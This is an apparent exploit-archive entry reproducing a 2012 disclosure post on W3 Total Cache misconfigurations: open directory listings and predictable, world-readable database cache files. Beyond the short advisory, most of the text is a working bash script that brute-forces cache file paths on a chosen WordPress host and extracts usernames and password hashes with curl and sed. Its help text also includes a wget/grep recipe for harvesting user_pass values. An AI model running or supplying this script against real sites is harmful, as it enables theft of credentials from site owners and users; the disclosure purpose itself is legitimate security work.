@@ -1,0 +1,156 @@
+id: 20048
+date: 12/24/2012
+title: WordPress Plugin - W3 Total Cache Remote Sql Injection Exploit
+author: zx2c4
+cves: 
+
+From the developers' description [1], W3 Total Cache is:
+
+
+    The most complete WordPress performance framework.
+    Recommended by web hosts like: MediaTemple, Host Gator, Page.ly and WP Engine and countless more.
+    Trusted by countless sites like: stevesouders.com, mattcutts.com, mashable.com, smashingmagazine.com, makeuseof.com, 
+    yoast.com, kiss925.com, pearsonified.com, lockergnome.com, johnchow.com, ilovetypography.com, webdesignerdepot.com, 
+    css-tricks.com and tens of thousands of others.
+    W3 Total Cache improves the user experience of your site by improving your server performance, caching every aspect 
+    of your site, reducing the download times and providing transparent content delivery network (CDN) integration.
+    Downloads: 1,388,876
+    Ratings: 4.6 out of 5 stars
+
+
+Unfortunately, it's frequently incorrectly deployed. When I set it up
+by going to the Wordpress panel and choosing "add plugin" and
+selecting the plugin from the Wordpress Plugin Catalog (or whatever),
+it left two avenues of attack open:
+
+1) Directory listings were enabled on the cache directory, which means
+anyone could easily recursively download all the database cache keys,
+and extract ones containing sensitive information, such as password
+hashes. A simple google search of
+"inurl:wp-content/plugins/w3tc/dbcache" and maybe some other magic
+reveals this wasn't just an issue for me. As W3 Total Cache already
+futzes with the .htaccess file, I see no reason for it not to add
+"Options -Indexes" to it upon installation. I haven't read any W3
+documentation, so it's possible this is a known and documented
+misconfiguration, but maybe not.
+
+2) Even with directory listings off, cache files are by default
+publicly downloadable, and the key values / file names of the database
+cache items are easily predictable. Again, it seems odd that "deny
+from all" isn't added to the .htaccess file. Maybe it's documented
+somewhere that you should secure your directories, or maybe it isn't;
+I'm not sure.
+
+If I had to categorize these holes, I'd say they're due to
+"misconfiguration", but I figure it's relevant to write in to
+full-disclosure & webappsec because I'm usually not horrible with
+configuring things and I made these mistakes several times without
+realizing. I'm copying the author on this email, as he may want to
+include a warning message where nieve folks like myself can see it, or
+document these somewhere if they're not already, or at least apply the
+two .htaccess tweaks mentioned above.
+
+Anyway I put together a short and simple shell script that works
+pretty decently against my own various wordpress websites, and
+exploits the configuration error in point (2) above. Exploiting point
+(1) can be done with wget & grep and is even more dull than the below
+exploit.
+
+****************
+
+
+#!/bin/bash
+# (C) Copyright 2012 Jason A. Donenfeld <Jason@zx2c4.com>. All Rights Reserved.
+#
+# |---------------|
+# | W3 Total Fail |
+# |    by zx2c4   |
+# |---------------|
+#
+# For more info, see built-in help text.
+# Most up to date version is available at: http://git.zx2c4.com/w3-total-fail/tree/w3-total-fail.sh
+#
+# This affects all current versions of W3 Total Cache up to and including the latest version, 0.9.2.4.
+
+set -f
+
+
+printf "\033[1m\033[31m"
+echo "<===== W3 Total Fail =====>"
+echo "<                         >"
+echo "<        by zx2c4         >"
+echo "<                         >"
+echo "<=========================>"
+echo
+echo
+printf "\033[0m\033[1m"
+echo "W3 Total Fail works by attempting to guess SQL queries that might"
+echo "contain important password hashes. It walks through"
+printf "\033[0m"
+echo "     http://\$wordpress/wp-content/w3tc/dbcache/..."
+printf "\033[1m"
+echo "until it's found the right files. If this directory has directory"
+echo "index listings turned on, you might have more luck downloading the"
+echo "entire folder and grepping locally for patterns, like so:"
+printf "\033[0m"
+echo "    \$ wget -np -r http://\$wordpress/wp-content/w3tc/dbcache/"
+echo "    \$ grep -Ra user_pass ."
+printf "\033[1m"
+echo "If directory listings are not available, then this is the tool for"
+echo "you, as it will try to brute force possible w3tc keys. It will try"
+echo "25 user ids and 25 site ids. Adjust the script for more or less range."
+echo
+echo "Enjoy!"
+echo
+echo "- zx2c4"
+echo "Dec 24, 2012"
+echo
+printf "\033[0m"
+
+printf "\033[0m\033[36m"
+echo "Usage: $0 HOST [URLBASE] [DBPREFIX]"
+echo
+echo "HOST should be the name of the host that is stored by wordpress. It"
+echo "may be the actual host name of the server, or it might be something"
+echo "different, depending on how wordpress is configured."
+echo "Example: blog.zx2c4.com"
+echo
+echo "URLBASE is the base URL of the wordpress blog which are prefixed in"
+echo "forming HTTP requests. If not specified it will default to http://\$HOST"
+echo "Example: http://blog.zx2c4.com or https://someblahblasite.com/my_blog"
+echo
+echo "DBPREFIX is the wordpress prefix used for database table names. It"
+echo "is often \"wp_\", which DBPREFIX defaults to if this argument is"
+echo "unspecified. Some wordpress installations will use an empty prefix,"
+echo "and others use a site-specific prefix. Most, however, will use the"
+echo "default."
+echo "Example: wp_"
+echo
+printf "\033[0m"
+
+if [ $# -lt 1 ]; then
+	echo "Error: HOST is a required argument."
+	exit 1
+fi
+
+host="$1"
+urlbase="${2:-http://$host}"
+db_prefix="$3"
+[ $# -lt 3 ] && db_prefix="wp_"
+
+for site_id in {1..25} 0; do for user_id in {1..25}; do
+	query="SELECT * FROM ${db_prefix}users WHERE ID = '$user_id'"
+	key="w3tc_${host}_${site_id}_sql_$(echo -n "$query"|md5sum|cut -d ' ' -f 1)"
+	hash="$(echo -n "$key"|md5sum|cut -d ' ' -f 1)"
+	hash_path="${hash:0:1}/${hash:1:1}/${hash:2:1}/${hash}"
+	url="$urlbase/wp-content/w3tc/dbcache/$hash_path"
+
+	printf "\033[33m"
+	echo -n "Attempting"
+	printf "\033[0m"
+	echo " $url..."
+	curl -s "$url" | tail -c +5 | tr -d '\n' | sed -n 's/.*"user_login";s:[0-9]\+:"\([^"]*\)";s:[0-9]\+:"user_pass";s:[0-9]\+:"\([^"]*\)".*/\x1b[1m\x1b[32mUsername: \1\nPassword hash: \2\x1b[0m\n/p'
+
+done; done
+
+#  0day.today [2023-03-26]  #
